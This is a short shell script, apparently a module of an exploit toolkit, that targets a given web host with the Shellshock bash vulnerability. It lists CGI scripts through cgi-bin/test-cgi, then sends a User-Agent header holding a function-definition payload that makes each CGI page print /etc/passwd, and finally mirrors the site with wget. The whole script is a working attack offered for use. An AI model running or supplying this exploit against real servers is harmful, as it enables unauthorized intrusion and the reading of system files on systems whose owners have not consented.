#! /bin/sh
export EXPLOIT_NAME="FindShellShockCGI"
export EXPLOIT_FIRE="shellshockcgi_run"

shellshockcgi_run(){
	alias wget=\wget --user-agent=Mozilla
	EXPLOIT_TMP=$HOME/.tmp/svirfneblin-netmonitor-exploit
	mkdir -p $EXPLOIT_TMP
	cd $EXPLOIT_TMP
	#attempt to find cgi scripts by exploiting cgi-bin/test-cgi*
	mkdir -p "$EXPLOIT_TMP/$1"
	cd "$1"
	CGI_LISTING=$(curl "http://$1/cgi-bin/test-cgi*")
	for CGI_PAGE in $CGI_LISTING; do
		wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" " http://$1/cgi-bin/test-cgi"
		wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" " http://$1/cgi-bin/$CGI_PAGE"

	done
	cd "$1"
	wget -r "$1"
	#
	#ALL_HTML=$(find ./ -type f -name "*.html" -exec cat {} \;)
	#CGI_SCRIPTS=$(echo $ALL_HTML | grep ".cgi")
}

#wget -U "() { test;};echo \"Content-type: text/plain\"; echo; echo; /bin/cat /etc/passwd" $CGI_PAGE